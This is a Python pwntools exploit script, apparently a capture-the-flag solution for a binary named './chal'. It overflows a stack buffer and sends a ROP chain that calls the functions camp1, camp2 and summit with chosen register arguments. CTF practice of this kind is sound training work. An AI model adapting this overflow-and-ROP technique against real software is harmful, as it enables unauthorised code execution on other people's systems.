#!/usr/bin/env python3
from pwn import *
import sys

# GLOBAL VARIABLES
binary = None
elf = None
libc = None
rop = None
gs = None
REMOTE = []

io = None
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
rr = lambda *a, **k: io.recvregex(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
st = lambda *a, **k: io.sendthen(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
slt = lambda *a, **k: io.sendlinethen(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)

def start(*args, **kwargs):
    global elf, rop, libc
    elf = context.binary = ELF(binary, False)
    libc = elf.libc
    rop = ROP(elf)
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    if args:
        arguments = [elf.path]
        arguments.extend(args)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=gs)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)

def main():
    global io, gs, binary, REMOTE, libc

    #################### 
    ### EXPLOIT CODE ###
    ####################

    context.terminal = ["terminator", "-x", "bash", "-c"]
    context.log_level  = 'debug'
   
    # set binary name
    binary = "./chal"
    #remote address
    REMOTE = []
    # set gdb script
    gs = """
    continue
    """
    # start process | remote process
    io = start()

    offset = 0x30 + 8
    ret = 0x0000000000401016
    pop_rdi = 0x000000000040118a
    pop_rsi = 0x000000000040118c


    payload = flat(
        cyclic(offset),
        ret,
        elf.symbols['camp1'],
        pop_rdi,
        0x67,
        elf.symbols['camp2'],
        pop_rdi,
        0x63,
        pop_rsi,
        0x7466,
        elf.symbols['summit']
    )  

    sla("(Maybe some rope would help?)\n", payload)
    ia()
    


if __name__ == "__main__":
    main()

